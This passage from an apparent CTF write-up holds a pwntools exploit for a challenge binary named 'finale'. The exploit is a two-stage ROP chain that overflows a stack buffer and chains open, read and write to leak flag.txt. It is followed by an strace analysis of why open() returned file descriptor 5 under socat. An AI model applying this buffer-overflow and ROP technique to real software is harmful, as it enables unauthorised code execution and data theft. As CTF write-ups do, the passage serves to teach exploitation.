int(proc.readuntil(b\u0026#39;]\u0026#39;).decode()[:-1], 16) pwn.log.info(f\u0026#34;buffer\u0026#39;s stack address provided: {hex(buffer_address)}\u0026#34;) # gadgets ===================================================================== pop_rdi = 0x00000000004011f2 pop_rsi = 0x00000000004011f4 open_plt = 0x4010e0 read_plt = 0x401090 write_plt = 0x401050 padding = 64 + 8 # buffer size + rbp size ropchain_stage1 = pwn.flat({ 0: [ b\u0026#34;flag.txt\\0\u0026#34;, b\u0026#39;a\u0026#39; * (padding - len(b\u0026#34;flag.txt\\0\u0026#34;)), pwn.p64(pop_rdi), pwn.p64(buffer_address), pwn.p64(pop_rsi), pwn.p64(0), pwn.p64(open_plt), # open(\u0026#34;flag.txt\u0026#34;, o_rdonly), file descriptor returned for \u0026#34;flag.txt\u0026#34; 5 (found from troubleshooting) pwn.p64(elf.symbols[\u0026#34;finale\u0026#34;]) ] }) # call to open() sets rdx to 0 with open(\u0026#34;exploit\u0026#34;, \u0026#34;wb+\u0026#34;) as f: f.write(b\u0026#34;s34s0nf1n4l3b00\\n\u0026#34;) f.write(ropchain_stage1) proc.sendline(ropchain_stage1) proc.readrepeat(1) ropchain_stage2 = pwn.flat({ padding: [ pwn.p64(pop_rdi), pwn.p64(5), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(read_plt), # read(5, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it pwn.p64(pop_rdi), pwn.p64(1), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(write_plt), # write(stdout, buffer, 84) ] }) proc.sendline(ropchain_stage2) proc.readuntil(b\u0026#34;that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;); pwn.log.info(f\u0026#34;flag: {proc.readline().decode()}\u0026#34;) digging deeper why did open() return 5?\nupon reading through strace logs, i found that socat registered 3, 4 for socketpair (socketpair are 2 file descriptors used for inter-process communication, they are bi-directional in nature. usually before forking a process creates a pair and then parent and child use one fd from the pair for read/write while close the other), while 5 was used for socket connection, and the newly created conenction was assigned 6.\nsocketpair(af_unix, sock_dgram, 0, [3, 4]) = 0 ... socket(af_inet, sock_stream, ipproto_tcp) = 5 bind(5, {sa_family=af_inet, sin_port=htons(9001), sin_addr=inet_addr(\u0026#34;0.0.0.0\u0026#34;)}, 16) = 0 getsockname(5, {sa_family=af_inet, sin_port=htons(9001), sin_addr=inet_addr(\u0026#34;0.0.0.0\u0026#34;)}, [16]) = 0 listen(5, 5) ... accept(5, {sa_family=af_inet, sin_port=htons(42340), sin_addr=inet_addr(\u0026#34;172.17.0.1\u0026#34;)}, [16]) = 6 once i run my exploit, 2 new processes are created pid 9, 10\npid 9 closed the socket connection and was out of the picture.\n[pid 9] close(6) = 0 meanwhile, pid 10 (returned by the original clone() call), closed 3, 4 and re-registered the socketpair. it further registered a new socket pair 5, 7 after closing the socket 5. but this one kept fd 6 pointing to current connection. next, it **clone()**s again to create pid 11. finally it closes 7, thus it would be using 5 for communication\nclone(child_stack=null, flags=clone_child_cleartid|clone_child_settid|sigchld, child_tidptr=0x7f06e36fda10) = 10 [pid 10] close(4 \u0026lt;unfinished ...\u0026gt; [pid 10] \u0026lt;... close resumed\u0026gt;) = 0 [pid 10] close(3) = 0 [pid 10] socketpair(af_unix, sock_dgram, 0, [3, 4]) = 0 ... [pid 10] close(5) = 0 [pid 10] socketpair(af_unix, sock_stream, 0, [5, 7]) = 0 ... [pid 10] clone(child_stack=null, flags=clone_child_cleartid|clone_child_settid|sigchldstrace: process 11 attached \u0026lt;unfinished ...\u0026gt; ... [pid 10] close(7) and finally, pid 11 closed 3, 4, 5 (socketpairs created by pid 10). re-creates two socketpairs 3-4. duplicated 7 as stdin and stdout and closed 7. finally pid 11 loads finale binary into memory.\n[pid 11] close(4 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 [pid 11] close(3 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 ... [pid 11] socketpair(af_unix, sock_dgram, 0 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... socketpair resumed\u0026gt;, [3, 4]) = 0 ... [pid 11] close(5 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 ... [pid 11] dup2(7, 0 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... dup2 resumed\u0026gt;) = 0 [pid 11] dup2(7, 1 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... dup2 resumed\u0026gt;) = 1 [pid 11] close(7) = 0 [pid 11] execve(\u0026#34;./challengebinary\u0026#34;, [\u0026#34;./challengebinary\u0026#34;], 0x5603cdb74e40 /* 12 vars */ \u0026lt;unfinished ...\u0026gt; when finale was loaded, it had following file descriptors\n0 - pointing to socketpair to communicate with pid 10 1 - pointing to socketpair to communicate with pid 10 2 - stderr 3 - pointing to socketpair it (pid 11) created 4 - pointing to socketpair it (pid 11) created 5 - free thus, 5 was allocated to all subsequent **open()**s\n","title":"Tracing file descriptors: A battle against poor writeups"}]
}

